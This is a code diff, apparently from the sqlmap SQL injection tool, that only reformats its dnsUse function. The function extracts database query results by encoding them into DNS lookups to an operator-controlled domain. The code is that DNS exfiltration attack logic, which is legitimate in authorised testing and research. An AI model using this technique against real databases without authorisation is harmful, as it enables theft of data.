@@ -34,6 +34,7 @@ from lib.core.unescaper import unescaper
 from lib.request.connect import Connect as Request
 from lib.utils.safe2bin import safecharencode
 
+
 def dnsUse(payload, expression):
     """
     Retrieve the output of a SQL query taking advantage of the DNS
@@ -58,18 +59,21 @@ def dnsUse(payload, expression):
             while True:
                 count += 1
                 prefix, suffix = ("%s" % randomStr(length=3, alphabet=DNS_BOUNDARIES_ALPHABET) for _ in xrange(2))
-                chunk_length = MAX_DNS_LABEL // 2 if Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.MYSQL, DBMS.PGSQL) else MAX_DNS_LABEL // 4 - 2
+                chunk_length = MAX_DNS_LABEL // 2 if Backend.getIdentifiedDbms() in (
+                DBMS.ORACLE, DBMS.MYSQL, DBMS.PGSQL) else MAX_DNS_LABEL // 4 - 2
                 _, _, _, _, _, _, fieldToCastStr, _ = agent.getFields(expression)
                 nulledCastedField = agent.nullAndCastField(fieldToCastStr)
                 extendedField = re.search(r"[^ ,]*%s[^ ,]*" % re.escape(fieldToCastStr), expression).group(0)
                 if extendedField != fieldToCastStr:  # e.g. MIN(surname)
                     nulledCastedField = extendedField.replace(fieldToCastStr, nulledCastedField)
                     fieldToCastStr = extendedField
-                nulledCastedField = queries[Backend.getIdentifiedDbms()].substring.query % (nulledCastedField, offset, chunk_length)
+                nulledCastedField = queries[Backend.getIdentifiedDbms()].substring.query % (
+                nulledCastedField, offset, chunk_length)
                 nulledCastedField = agent.hexConvertField(nulledCastedField)
                 expressionReplaced = expression.replace(fieldToCastStr, nulledCastedField, 1)
 
-                expressionRequest = getSQLSnippet(Backend.getIdentifiedDbms(), "dns_request", PREFIX=prefix, QUERY=expressionReplaced, SUFFIX=suffix, DOMAIN=conf.dnsDomain)
+                expressionRequest = getSQLSnippet(Backend.getIdentifiedDbms(), "dns_request", PREFIX=prefix,
+                                                  QUERY=expressionReplaced, SUFFIX=suffix, DOMAIN=conf.dnsDomain)
                 expressionUnescaped = unescaper.escape(expressionRequest)
 
                 if Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.PGSQL):
@@ -102,13 +106,15 @@ def dnsUse(payload, expression):
             retVal = output
 
             if kb.dnsTest is not None:
-                dataToStdout("[%s] [INFO] %s: %s\n" % (time.strftime("%X"), "retrieved" if count > 0 else "resumed", safecharencode(output)))
+                dataToStdout("[%s] [INFO] %s: %s\n" % (
+                time.strftime("%X"), "retrieved" if count > 0 else "resumed", safecharencode(output)))
 
                 if count > 0:
                     hashDBWrite(expression, output)
 
         if not kb.bruteMode:
-            debugMsg = "performed %d quer%s in %.2f seconds" % (count, 'y' if count == 1 else "ies", calculateDeltaSeconds(start))
+            debugMsg = "performed %d quer%s in %.2f seconds" % (
+            count, 'y' if count == 1 else "ies", calculateDeltaSeconds(start))
             logger.debug(debugMsg)
 
     elif conf.dnsDomain:
